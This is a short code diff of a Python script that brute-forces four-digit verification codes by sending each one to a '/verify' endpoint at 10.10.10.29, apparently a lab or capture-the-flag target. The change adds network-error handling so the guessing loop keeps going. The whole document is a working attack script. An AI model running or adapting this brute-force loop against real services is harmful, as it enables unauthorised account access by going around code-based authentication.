@@ -27,7 +27,11 @@ import requests
 url='http://10.10.10.29/verify'
 for i in range(10000):
     code=f'{i:04d}'
-    r=requests.post(url,data={'code':code},timeout=3)
+    try:
+        r=requests.post(url,data={'code':code},timeout=3)
+    except requests.RequestException as exc:
+        print('Erreur réseau:', exc)
+        continue
     if 'OK' in r.text:
         print('Valid:', code)
         break
